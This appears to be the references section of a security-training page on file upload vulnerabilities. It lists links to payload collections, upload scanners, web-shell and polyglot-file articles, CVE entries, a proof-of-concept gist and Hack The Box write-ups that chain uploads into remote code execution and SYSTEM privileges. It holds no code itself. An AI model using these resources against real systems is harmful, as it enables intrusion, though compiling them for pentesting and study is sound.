- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
